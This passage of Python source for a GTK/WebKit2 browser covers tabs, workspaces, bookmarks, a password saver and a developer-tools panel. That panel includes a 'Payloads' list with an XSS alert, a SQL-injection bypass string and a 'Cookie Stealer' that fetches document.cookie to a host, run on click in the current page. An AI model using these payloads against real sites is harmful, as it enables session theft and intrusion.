            if not hasattr(self, 'current_webview'): return
            uri = self.current_webview.get_uri()
            if not uri or uri.startswith("zero://"): return
            domain = urllib.parse.urlparse(uri).hostname
            if not domain: return
            
            self.lbl_domain.set_text(domain)
            perms = self.site_permissions.get(domain, {"js": True, "images": True})
            
            self.switch_js.handler_block_by_func(self.on_perm_changed)
            self.switch_images.handler_block_by_func(self.on_perm_changed)
            self.switch_js.set_active(perms["js"])
            self.switch_images.set_active(perms["images"])
            self.switch_js.handler_unblock_by_func(self.on_perm_changed)
            self.switch_images.handler_unblock_by_func(self.on_perm_changed)
            
            self.perm_popover.popup()
        elif pos == Gtk.EntryIconPosition.SECONDARY:
            if hasattr(self, 'current_webview'): self.current_webview.reload()

    def on_perm_changed(self, switch, gparam):
        if not hasattr(self, 'current_webview'): return
        uri = self.current_webview.get_uri()
        if not uri: return
        domain = urllib.parse.urlparse(uri).hostname
        if not domain: return
        
        self.site_permissions[domain] = {
            "js": self.switch_js.get_active(),
            "images": self.switch_images.get_active()
        }
        self.save_site_permissions()
        self.apply_site_permissions(self.current_webview, uri)
        self.current_webview.reload()


    # ================= FIND IN PAGE =================
    def on_find_changed(self, entry):
        if not hasattr(self, 'current_webview'): return
        text = entry.get_text()
        fc = self.current_webview.get_find_controller()
        if not text:
            fc.search_finish()
            self.find_lbl.set_text("0/0")
            return
        fc.search(text, WebKit2.FindOptions.CASE_INSENSITIVE | WebKit2.FindOptions.WRAP_AROUND, 100)
        
        def on_found(controller, match_count):
            self.find_lbl.set_text(f"{match_count} matches")
        fc.connect("counted-matches", on_found)

    def on_find_next(self, btn):
        if hasattr(self, 'current_webview'): self.current_webview.get_find_controller().search_next()

    def on_find_prev(self, btn):
        if hasattr(self, 'current_webview'): self.current_webview.get_find_controller().search_previous()

    def on_find_close(self, btn):
        self.find_revealer.set_reveal_child(False)
        if hasattr(self, 'current_webview'): self.current_webview.get_find_controller().search_finish()


    def build_command_palette(self):
        self.cmd_window = Gtk.Window(title="Command Palette")
        self.cmd_window.set_decorated(False)
        self.cmd_window.set_default_size(600, 400)
        self.cmd_window.set_position(Gtk.WindowPosition.CENTER_ON_PARENT)
        self.cmd_window.set_transient_for(self)
        self.cmd_window.set_modal(True)
        ctx = self.cmd_window.get_style_context()
        ctx.add_class("cmd-palette")
        
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.cmd_window.add(vbox)
        
        self.cmd_entry = Gtk.SearchEntry()
        self.cmd_entry.set_placeholder_text("Search bookmarks, history, or type '>' for commands...")
        self.cmd_entry.set_margin_top(15); self.cmd_entry.set_margin_bottom(15); self.cmd_entry.set_margin_start(15); self.cmd_entry.set_margin_end(15)
        self.cmd_entry.connect("changed", self.on_cmd_changed)
        self.cmd_entry.connect("activate", self.on_cmd_activate)
        vbox.pack_start(self.cmd_entry, False, False, 0)
        
        self.cmd_listbox = Gtk.ListBox()
        self.cmd_listbox.connect("row-activated", self.on_cmd_row_activated)
        scroll = Gtk.ScrolledWindow()
        scroll.add(self.cmd_listbox)
        vbox.pack_start(scroll, True, True, 0)
        
        self.cmd_window.connect("key-press-event", self.on_cmd_key)

    def show_command_palette(self):
        if not hasattr(self, 'cmd_window'): self.build_command_palette()
        self.cmd_entry.set_text("")
        self.on_cmd_changed(self.cmd_entry)
        self.cmd_window.show_all()
        self.cmd_entry.grab_focus()

    def on_cmd_key(self, w, e):
        if e.keyval == Gdk.KEY_Escape:
            self.cmd_window.hide()
            return True
        elif e.keyval == Gdk.KEY_Down:
            self.cmd_listbox.grab_focus()
            return True
        return False

    def on_cmd_changed(self, entry):
        q = entry.get_text().lower()
        for c in self.cmd_listbox.get_children(): self.cmd_listbox.remove(c)
        
        def add_item(title, url, icon):
            row = Gtk.ListBoxRow(); row.url_data = url
            hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
            hbox.set_margin_top(8); hbox.set_margin_bottom(8); hbox.set_margin_start(10)
            img = Gtk.Image.new_from_icon_name(icon, Gtk.IconSize.MENU)
            vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
            l1 = Gtk.Label(label=title); l1.set_halign(Gtk.Align.START); l1.set_ellipsize(Pango.EllipsizeMode.END)
            l2 = Gtk.Label(label=url); l2.set_halign(Gtk.Align.START); l2.set_ellipsize(Pango.EllipsizeMode.END); l2.get_style_context().add_class("dim-label")
            vbox.pack_start(l1, False, False, 0); vbox.pack_start(l2, False, False, 0)
            hbox.pack_start(img, False, False, 0); hbox.pack_start(vbox, True, True, 0)
            row.add(hbox); row.show_all()
            self.cmd_listbox.add(row)

        if q.startswith(">"):
            cmd_q = q[1:].strip()
            commands = [
                ("New Tab", "cmd:new_tab", "tab-new-symbolic"),
                ("Sessions Manager", "zero://sessions", "folder-symbolic"),
                ("Markdown Editor", "zero://markdown", "accessories-text-editor-symbolic"),
                ("Settings", "zero://settings", "preferences-system-symbolic"),
                ("Shortcuts", "zero://shortcuts", "help-keyboard-shortcuts-symbolic"),
                ("Toggle Theme", "cmd:toggle_theme", "weather-clear-symbolic"),
                ("Toggle Private Mode", "cmd:private_mode", "security-high-symbolic")
            ]
            for c in commands:
                if cmd_q in c[0].lower():
                    add_item(c[0], c[1], c[2])
        else:
            count = 0
            for row in self.bookmarks_list.get_children():
                vbox = row.get_child().get_children()[1]
                title = vbox.get_children()[0].get_text()
                url = row.url_data
                if q in title.lower() or q in url.lower():
                    add_item(title, url, "bookmark-new-symbolic")
                    count += 1
                if count > 5: break
            count = 0
            for row in self.history_list.get_children():
                vbox = row.get_child().get_children()[1]
                title = vbox.get_children()[0].get_text()
                url = row.url_data
                if q in title.lower() or q in url.lower():
                    add_item(title, url, "document-open-recent-symbolic")
                    count += 1
                if count > 5: break

    def on_cmd_activate(self, entry):
        row = self.cmd_listbox.get_row_at_index(0)
        if row: self.on_cmd_row_activated(self.cmd_listbox, row)

    def on_cmd_row_activated(self, listbox, row):
        url = getattr(row, 'url_data', '')
        self.cmd_window.hide()
        if url == "cmd:new_tab":
            self.new_tab("zero://start")
        elif url == "cmd:toggle_theme":
            settings = Gtk.Settings.get_default()
            is_dark = settings.get_property("gtk-application-prefer-dark-theme")
            settings.set_property("gtk-application-prefer-dark-theme", not is_dark)
        elif url == "cmd:private_mode":
            self.btn_private.set_active(not self.btn_private.get_active())
        elif url:
            if hasattr(self, 'current_webview'):
                self.current_webview.load_uri(url)
            else:
                self.new_tab(url)


    def load_userscripts(self):
        for f in os.listdir(self.userscripts_dir):
            if f.endswith(".js"):
                try:
                    with open(os.path.join(self.userscripts_dir, f), "r") as script_file:
                        content = script_file.read()
                        user_script = WebKit2.UserScript(content, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserScriptInjectionTime.END, None, None)
                        self.user_content.add_script(user_script)
                        print(f"[*] Loaded User Script: {f}")
                except Exception as e:
                    print(f"Error loading {f}:", e)

    def load_search_engines(self):
        if not os.path.exists(self.search_engines_path):
            with open(self.search_engines_path, "w") as f: json.dump(self.search_engines, f, indent=4)
        else:
            try:
                with open(self.search_engines_path, "r") as f: self.search_engines = json.load(f)
            except: pass

    def load_session(self):
        if os.path.exists(self.session_path):
            try:
                with open(self.session_path, "r") as f:
                    session = json.load(f)
                if session:
                    first_workspace = session[-1].get("workspace", "default")
                    for s in session:
                        self.current_workspace = s.get("workspace", "default")
                        self.new_tab(s.get("url", "zero://start"))
                    self.workspace_combo.set_active_id(first_workspace)
                    self.current_workspace = first_workspace
                    return
            except Exception as e:
                print("Session error:", e)
        self.new_tab("zero://start")

    def save_session(self):
        if self.is_private: return
        session = []
        for wid, data in self.tabs_map.items():
            wv, row, ws = data
            uri = wv.get_uri()
            if uri and not uri.startswith("zero://"):
                session.append({"url": uri, "workspace": ws})
        try:
            with open(self.session_path, "w") as f: json.dump(session, f)
        except: pass

    def on_settings_message(self, manager, js_result):
        msg = js_result.get_js_value().to_string()
        if msg == "clear_history":
            for c in self.history_list.get_children(): self.history_list.remove(c)
            self.rebuild_url_completion()
            print("[*] History cleared.")
        elif msg == "clear_bookmarks":
            for c in self.bookmarks_list.get_children(): self.bookmarks_list.remove(c)
            if os.path.exists(self.bm_path): os.remove(self.bm_path)
            self.rebuild_url_completion()
            print("[*] Bookmarks cleared.")
        elif msg == "clear_passwords":
            for c in self.passwords_list.get_children(): self.passwords_list.remove(c)
            self.passwords.clear()
            if os.path.exists(self.pw_path): os.remove(self.pw_path)
            print("[*] Passwords cleared.")
        elif msg == "toggle_theme":
            settings = Gtk.Settings.get_default()
            is_dark = settings.get_property("gtk-application-prefer-dark-theme")
            settings.set_property("gtk-application-prefer-dark-theme", not is_dark)
            print(f"[*] Theme switched to {'Light' if is_dark else 'Dark'}")
        elif msg == "open_search_config":
            os.system(f"xdg-open '{self.search_engines_path}'")
        elif msg == "open_userscripts_dir":
            os.system(f"xdg-open '{self.userscripts_dir}'")
        elif msg == "toggle_webrtc":
            self.webrtc_protected = not self.webrtc_protected
            for wid, data in self.tabs_map.items():
                wv = data[0]
                s = wv.get_settings()
                if hasattr(s, 'set_enable_media_stream'):
                    s.set_enable_media_stream(not self.webrtc_protected)
            print(f"[*] WebRTC/MediaStream Protection is now {'ON' if self.webrtc_protected else 'OFF'}")

    def on_private_toggled(self, btn):
        self.is_private = btn.get_active()
        ctx = self.header.get_style_context()
        if self.is_private:
            ctx.add_class("private-header")
            self.header.set_subtitle("Private Mode Active")
        else:
            ctx.remove_class("private-header")
            self.header.set_subtitle("")

    # ================= POPOVERS =================
    def build_downloads_popover(self):
        self.btn_downloads = Gtk.ToggleButton()
        self.btn_downloads.add(Gtk.Image.new_from_icon_name("folder-download-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_downloads)
        self.downloads_popover = Gtk.Popover(); self.downloads_popover.set_relative_to(self.btn_downloads)
        self.downloads_list = Gtk.ListBox(); self.downloads_list.set_selection_mode(Gtk.SelectionMode.NONE)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(350, 400); scroll.add(self.downloads_list); self.downloads_popover.add(scroll)
        self.btn_downloads.connect("toggled", lambda b: self.downloads_popover.popup() if b.get_active() else self.downloads_popover.popdown())
        self.downloads_popover.connect("closed", lambda p: self.btn_downloads.set_active(False))

    def build_history_popover(self):
        self.btn_history = Gtk.ToggleButton()
        self.btn_history.add(Gtk.Image.new_from_icon_name("document-open-recent-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_history)
        self.history_popover = Gtk.Popover(); self.history_popover.set_relative_to(self.btn_history)
        self.history_list = Gtk.ListBox(); self.history_list.connect("row-activated", self.on_popover_row_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.history_list); self.history_popover.add(scroll)
        self.btn_history.connect("toggled", lambda b: self.history_popover.popup() if b.get_active() else self.history_popover.popdown())
        self.history_popover.connect("closed", lambda p: self.btn_history.set_active(False))

    def build_bookmarks_popover(self):
        self.btn_bookmark = Gtk.ToggleButton()
        self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_bookmark)
        self.bookmarks_popover = Gtk.Popover(); self.bookmarks_popover.set_relative_to(self.btn_bookmark)
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        
        btn_add = Gtk.Button(label="Bookmark Current Page")
        btn_add.connect("clicked", self.on_add_bookmark)
        box.pack_start(btn_add, False, False, 5)
        
        self.bookmarks_list = Gtk.ListBox(); self.bookmarks_list.connect("row-activated", self.on_popover_row_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.bookmarks_list); box.pack_start(scroll, True, True, 0)
        self.bookmarks_popover.add(box)
        self.btn_bookmark.connect("toggled", lambda b: self.bookmarks_popover.popup() if b.get_active() else self.bookmarks_popover.popdown())
        self.bookmarks_popover.connect("closed", lambda p: self.btn_bookmark.set_active(False))

    def build_passwords_popover(self):
        self.btn_passwords = Gtk.ToggleButton()
        self.btn_passwords.add(Gtk.Image.new_from_icon_name("dialog-password-symbolic", Gtk.IconSize.MENU))
        self.header.pack_end(self.btn_passwords)
        self.passwords_popover = Gtk.Popover(); self.passwords_popover.set_relative_to(self.btn_passwords)
        self.passwords_list = Gtk.ListBox(); self.passwords_list.set_selection_mode(Gtk.SelectionMode.NONE)
        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.passwords_list); self.passwords_popover.add(scroll)
        self.btn_passwords.connect("toggled", lambda b: self.passwords_popover.popup() if b.get_active() else self.passwords_popover.popdown())
        self.passwords_popover.connect("closed", lambda p: self.btn_passwords.set_active(False))

    def add_to_popover(self, listbox, main_text, sub_text, icon_name):
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10); hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10)
        icon = Gtk.Image.new_from_icon_name(icon_name, Gtk.IconSize.MENU)
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        l1 = Gtk.Label(label=main_text); l1.set_halign(Gtk.Align.START); l1.set_ellipsize(Pango.EllipsizeMode.END); l1.set_max_width_chars(30)
        l2 = Gtk.Label(label=sub_text); l2.set_halign(Gtk.Align.START); l2.set_ellipsize(Pango.EllipsizeMode.END); l2.set_max_width_chars(30); l2.get_style_context().add_class("dim-label")
        vbox.pack_start(l1, False, False, 0); vbox.pack_start(l2, False, False, 0)
        hbox.pack_start(icon, False, False, 0); hbox.pack_start(vbox, True, True, 0)
        row.add(hbox); row.show_all()
        row.url_data = sub_text
        listbox.insert(row, 0)
        self.rebuild_url_completion()

    def on_popover_row_clicked(self, listbox, row):
        if hasattr(row, 'url_data'):
            self.url_bar.set_text(row.url_data)
            self.on_url_activate(self.url_bar)
            if listbox == self.history_list: self.btn_history.set_active(False)
            if listbox == self.bookmarks_list: self.btn_bookmark.set_active(False)

    def on_open_file(self, btn):
        dialog = Gtk.FileChooserNative.new("Open File", self, Gtk.FileChooserAction.OPEN, "_Open", "_Cancel")
        if dialog.run() == Gtk.ResponseType.ACCEPT:
            uri = dialog.get_uri()
            if hasattr(self, 'current_webview'): self.current_webview.load_uri(uri)
        dialog.destroy()

    def on_password_intercepted(self, manager, js_result):
        if self.is_private: return
        try:
            data = json.loads(js_result.get_js_value().to_string())
            domain = data.get("url")
            user = data.get("user")
            pw = data.get("pass")
            if domain and pw:
                self.passwords[domain] = {"user": user, "pass": pw}
                self.save_passwords()
                print(f"[*] Intercepted and saved credentials for {domain}")
        except Exception as e:
            print("Error parsing password interception:", e)

    def load_passwords(self):
        if os.path.exists(self.pw_path):
            try:
                with open(self.pw_path, 'r') as f:
                    self.passwords = json.load(f)
                    for domain, cred in self.passwords.items():
                        self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")
            except: pass

    def save_passwords(self):
        with open(self.pw_path, 'w') as f: json.dump(self.passwords, f)
        for c in self.passwords_list.get_children(): self.passwords_list.remove(c)
        for domain, cred in self.passwords.items(): self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")

    def load_bookmarks(self):
        if os.path.exists(self.bm_path):
            try:
                with open(self.bm_path, 'r') as f:
                    for title, url in json.load(f): self.add_to_popover(self.bookmarks_list, title, url, "bookmark-new-symbolic")
            except: pass

    def save_bookmarks(self):
        bookmarks = []
        for row in self.bookmarks_list.get_children():
            vbox = row.get_child().get_children()[1]
            title = vbox.get_children()[0].get_text()
            url = row.url_data
            bookmarks.append([title, url])
        with open(self.bm_path, 'w') as f: json.dump(bookmarks, f)

    def on_add_bookmark(self, btn):
        if hasattr(self, 'current_webview'):
            uri = self.current_webview.get_uri()
            if uri and not uri.startswith("zero://"):
                title = self.current_webview.get_title() or "Untitled"
                self.add_to_popover(self.bookmarks_list, title, uri, "bookmark-new-symbolic")
                self.save_bookmarks()
                self.btn_bookmark.set_active(False)

    def update_zoom_label(self):
        if hasattr(self, 'current_webview'):
            lvl = self.current_webview.get_zoom_level()
            if abs(lvl - 1.0) < 0.05:
                self.lbl_zoom.set_text("")
            else:
                self.lbl_zoom.set_text(f"{int(lvl * 100)}%")

    def on_key_press(self, widget, event):
        if event.state & Gdk.ModifierType.CONTROL_MASK:
            if event.keyval == Gdk.KEY_Tab or event.keyval == Gdk.KEY_ISO_Left_Tab:
                if hasattr(self, 'tab_switcher_window') and self.tab_switcher_window.get_visible():
                    self.cycle_tab_switcher()
                else:
                    self.show_tab_switcher()
                return True
            elif event.keyval == Gdk.KEY_t:
                self.new_tab("zero://start")
                return True
            elif event.keyval == Gdk.KEY_w:
                if hasattr(self, 'current_webview'):
                    for wid, data in self.tabs_map.items():
                        if data[0] == self.current_webview:
                            self.close_tab(wid)
                            break
                return True
            elif event.keyval == Gdk.KEY_l:
                self.url_bar.grab_focus()
                return True
            elif event.keyval == Gdk.KEY_k:
                self.show_command_palette()
                return True
            elif event.keyval == Gdk.KEY_f:
                self.find_revealer.set_reveal_child(True)
                self.find_entry.grab_focus()
                return True
            elif event.keyval in (Gdk.KEY_plus, Gdk.KEY_equal):
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(self.current_webview.get_zoom_level() + 0.1)
                    self.update_zoom_label()
                return True
            elif event.keyval == Gdk.KEY_minus:
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(max(0.3, self.current_webview.get_zoom_level() - 0.1))
                    self.update_zoom_label()
                return True
            elif event.keyval == Gdk.KEY_0:
                if hasattr(self, 'current_webview'):
                    self.current_webview.set_zoom_level(1.0)
                    self.update_zoom_label()
                return True
        elif event.keyval == Gdk.KEY_Escape:
            if self.find_revealer.get_reveal_child():
                self.on_find_close(None)
                return True
        return False

    def on_key_release(self, widget, event):
        if event.keyval in (Gdk.KEY_Control_L, Gdk.KEY_Control_R):
            if hasattr(self, 'tab_switcher_window') and self.tab_switcher_window.get_visible():
                self.tab_switcher_window.hide()
                self.activate_selected_switcher_tab()
        return False

    def on_reader_mode(self, btn):
        if not hasattr(self, 'current_webview'): return
        js = """
        (function(){
            if(window.__readerModeActive){
                window.location.reload();
                return;
            }
            let title = document.title;
            let article = document.querySelector('article') || document.querySelector('main') || document.body;
            let content = article.innerHTML;
            document.head.innerHTML = '<style>body{max-width:800px;margin:40px auto;padding:20px;font-family:Georgia,serif;font-size:18px;line-height:1.8;color:#333;background:#fdfdfd;} img{max-width:100%;height:auto;} @media (prefers-color-scheme: dark) { body { color: #eee; background: #1a1a1a; } a { color: #8ab4f8; } }</style>';
            document.body.innerHTML = '<h1 style="font-family:sans-serif;margin-bottom:30px;">' + title + '</h1>' + content;
            window.__readerModeActive = true;
        })();
        """
        self.current_webview.run_javascript(js, None, None, None)

    def on_pip_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        js = "if(document.pictureInPictureElement){document.exitPictureInPicture();}else{const v=document.querySelector('video');if(v){v.requestPictureInPicture();}}"
        self.current_webview.run_javascript(js, None, None, None)

    def on_take_screenshot(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_snapshot_ready(webview, result):
            try:
                surface = webview.get_snapshot_finish(result)
                if surface:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filepath = os.path.join(os.path.expanduser("~"), "Downloads", f"zero_screenshot_{ts}.png")
                    surface.write_to_png(filepath)
                    btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
                    GLib.timeout_add(1500, lambda: btn.set_image(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU)) and False)
            except: pass
        self.current_webview.get_snapshot(WebKit2.SnapshotRegion.FULL_DOCUMENT, WebKit2.SnapshotOptions.NONE, None, on_snapshot_ready)

    def build_tabs_sidebar(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(200, -1); box.get_style_context().add_class("vertical-tabs-box")
        
        # Workspace Dropdown
        self.workspace_combo = Gtk.ComboBoxText()
        self.workspace_combo.append("default", "Default Workspace")
        self.workspace_combo.append("work", "Work")
        self.workspace_combo.append("social", "Social")
        self.workspace_combo.append("research", "Research")
        self.workspace_combo.set_active(0)
        self.workspace_combo.connect("changed", self.on_workspace_changed)
        self.workspace_combo.set_margin_top(10); self.workspace_combo.set_margin_bottom(10); self.workspace_combo.set_margin_start(10); self.workspace_combo.set_margin_end(10)
        box.pack_start(self.workspace_combo, False, False, 0)
        
        self.tab_listbox = Gtk.ListBox(); self.tab_listbox.get_style_context().add_class("vertical-tabs-list"); self.tab_listbox.connect("row-activated", self.on_tab_clicked)
        scroll = Gtk.ScrolledWindow(); scroll.add(self.tab_listbox); box.pack_start(scroll, True, True, 0)
        return box
        
    def on_workspace_changed(self, combo):
        self.current_workspace = combo.get_active_id()
        visible_count = 0
        first_visible = None
        for wid, data in self.tabs_map.items():
            wv, row, ws = data
            if ws == self.current_workspace:
                row.show()
                visible_count += 1
                if not first_visible: first_visible = row
            else:
                row.hide()
        
        if visible_count == 0:
            self.new_tab("zero://start")
        elif first_visible:
            self.tab_listbox.select_row(first_visible)
            self.on_tab_clicked(self.tab_listbox, first_visible)

    def on_tabs_toggled(self, btn): self.tabs_revealer.set_reveal_child(btn.get_active())

    def on_tab_clicked(self, listbox, row):
        wid = row.get_name(); self.tab_stack.set_visible_child_name(wid); wv = self.tabs_map[wid][0]; self.current_webview = wv
        self.url_bar.set_text(wv.get_uri() or ""); self.header.set_title(wv.get_title() or "Zero Browser")
        self.update_zoom_label()

    def toggle_mute(self, wid, btn_or_menu=None):
        if wid in self.tabs_map:
            wv, row, ws = self.tabs_map[wid]
            is_muted = not wv.get_is_muted()
            wv.set_is_muted(is_muted)
            # Find the mute button in the row to update its icon
            hbox = row.get_child().get_children()[0]
            for child in hbox.get_children():
                if isinstance(child, Gtk.ToggleButton):
                    child.set_active(is_muted)
                    child.set_image(Gtk.Image.new_from_icon_name("audio-volume-muted-symbolic" if is_muted else "audio-volume-high-symbolic", Gtk.IconSize.MENU))
                    break

    def close_tab(self, wid, btn=None):
        if wid in self.tabs_map:
            wv, row, ws = self.tabs_map[wid]
            self.tab_listbox.remove(row)
            if wv.get_parent():
                self.tab_stack.remove(wv.get_parent())
            wv.destroy()
            del self.tabs_map[wid]
            
            # Find next visible tab in current workspace
            next_visible = None
            for c in self.tab_listbox.get_children():
                if c.is_visible():
                    next_visible = c
                    break
            
            if next_visible:
                self.tab_listbox.select_row(next_visible); self.on_tab_clicked(self.tab_listbox, next_visible)
            else: self.new_tab("zero://start")

    def popout_tab(self, wid):
        if wid in self.tabs_map:
            wv, row, ws = self.tabs_map[wid]
            parent = wv.get_parent()
            if parent: self.tab_stack.remove(parent)
            
            popout_win = Gtk.Window(title=wv.get_title() or "PiP - Zero Browser")
            popout_win.set_default_size(500, 350)
            popout_win.set_keep_above(True)
            popout_win.set_type_hint(Gdk.WindowTypeHint.UTILITY)
            
            hb = Gtk.HeaderBar()
            hb.set_show_close_button(True)
            hb.set_title(wv.get_title() or "PiP")
            popout_win.set_titlebar(hb)
            
            scroll = Gtk.ScrolledWindow()
            scroll.add(wv)
            popout_win.add(scroll)
            popout_win.show_all()
            
            def on_popout_close(w, e):
                popout_win.remove(scroll)
                scroll.remove(wv)
                self.tab_stack.add_named(scroll, wid)
                scroll.add(wv)
                self.tab_stack.show_all()
                if hasattr(self, 'current_webview') and self.current_webview == wv:
                    self.tab_stack.set_visible_child_name(wid)
                return False
                
            popout_win.connect("delete-event", on_popout_close)

    def on_devtools_toggled(self, btn):
        if not self.devtools_window:
            self.devtools_revealer.set_reveal_child(btn.get_active())

    def build_devtools(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(-1, 280)
        toolbar = Gtk.Toolbar(); toolbar.get_style_context().add_class("primary-toolbar")
        self.dev_stack = Gtk.Stack(); self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        switcher = Gtk.StackSwitcher(); switcher.set_stack(self.dev_stack)
        toolbar_item = Gtk.ToolItem(); toolbar_item.add(switcher); toolbar.insert(toolbar_item, 0)
        
        sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.btn_adblock = Gtk.ToggleButton(label="Adblock ON"); self.btn_adblock.set_active(True); self.btn_adblock.connect("toggled", self.on_adblock_toggled); sec_box.pack_start(self.btn_adblock, False, False, 0)
        self.ua_combo = Gtk.ComboBoxText(); self.ua_combo.append("default", "Standard UA"); self.ua_combo.append("mobile", "Mobile (iPhone)"); self.ua_combo.append("bot", "Googlebot"); self.ua_combo.set_active(0); self.ua_combo.connect("changed", self.on_ua_changed); sec_box.pack_end(self.ua_combo, False, False, 0)
        
        # Native Inspector
        btn_native = Gtk.Button(); btn_native.add(Gtk.Image.new_from_icon_name("applications-development-symbolic", Gtk.IconSize.MENU)); btn_native.set_tooltip_text("Open Native Web Inspector"); btn_native.connect("clicked", lambda b: self.current_webview.get_inspector().show() if hasattr(self, 'current_webview') else None); sec_box.pack_end(btn_native, False, False, 0)

        # Detach button
        btn_detach = Gtk.Button(); btn_detach.add(Gtk.Image.new_from_icon_name("view-restore-symbolic", Gtk.IconSize.MENU)); btn_detach.set_tooltip_text("Detach to separate window"); btn_detach.connect("clicked", self.on_detach_devtools); sec_box.pack_end(btn_detach, False, False, 0)
        
        ti_sec = Gtk.ToolItem(); ti_sec.set_expand(True); ti_sec.add(sec_box); toolbar.insert(ti_sec, 1)
        box.pack_start(toolbar, False, False, 0); box.pack_start(self.dev_stack, True, True, 0)
        
        self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console"); self.dev_stack.add_titled(self.build_network_panel(), "network", "Network"); self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies"); self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage"); self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source"); self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject"); self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
        self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
        
        plist = Gtk.ListBox()
        for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
        plist.connect("row-activated", lambda lb, r: self.current_webview.run_javascript(r.get_child().get_children()[1].get_text()[11:], None, None, None) if hasattr(self, 'current_webview') and r.get_child().get_children()[1].get_text().startswith("javascript:") else None)
        scroll = Gtk.ScrolledWindow(); scroll.add(plist)
        self.dev_stack.add_titled(scroll, "payloads", "Payloads")
        
        return box

    def on_detach_devtools(self, btn):
        if self.devtools_window:
            # Re-attach
            self.devtools_window.remove(self.devtools_box)
            self.devtools_window.destroy()
            self.devtools_window = None
            self.devtools_revealer.add(self.devtools_box)
            self.devtools_revealer.set_reveal_child(self.btn_devtools.get_active())
            btn.set_image(Gtk.Image.new_from_icon_name("view-restore-symbolic", Gtk.IconSize.MENU))
        else:
            # Detach
            self.devtools_revealer.set_reveal_child(False)
            self.devtools_revealer.remove(self.devtools_box)
            self.devtools_window = Gtk.Window(title="Zero Hacker Tools")
            self.devtools_window.set_default_size(800, 400)
            self.devtools_window.add(self.devtools_box)
            self.devtools_window.connect("delete-event", lambda w, e: self.on_detach_devtools(btn) or True)
            self.devtools_window.show_all()
            btn.set_image(Gtk.Image.new_from_icon_name("view-fullscreen-symbolic", Gtk.IconSize.MENU))

    def on_adblock_toggled(self, btn):
        self.adblock_enabled = btn.get_active(); btn.set_label("Adblock ON" if self.adblock_enabled else "Adblock OFF")
        self.user_content.remove_all_style_sheets()
        self.user_content.add_style_sheet(WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if self.adblock_enabled: self.user_content.add_style_sheet(WebKit2.UserStyleSheet(COSMETIC_ADBLOCK_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
        if hasattr(self, 'current_webview'): self.current_webview.reload()

    def on_ua_changed(self, combo):
        val = combo.get_active_id(); ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" if val == "mobile" else "Googlebot/2.1 (+http://www.google.com/bot.html)" if val == "bot" else None
        if hasattr(self, 'current_webview'):
            settings = self.current_webview.get_settings(); settings.set_user_agent(ua) if ua else settings.set_user_agent(None); self.current_webview.set_settings(settings); self.current_webview.reload()

    def on_dev_stack_changed(self, stack, param):
        name = stack.get_visible_child_name()
        if name == "cookies": self.refresh_cookies()
        elif name == "storage": self.refresh_storage()
        elif name == "source": self.on_fetch_source(None)

    def on_download_started(self, context, download):
        filename = download.get_request().get_uri().split("/")[-1] or "downloaded_file"
        dest = os.path.join(os.path.expanduser("~"), "Downloads", filename)
        download.set_destination("file://" + dest)
        
        row = Gtk.ListBoxRow()
        row.set_margin_top(5); row.set_margin_bottom(5); row.set_margin_start(10); row.set_margin_end(10)
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        
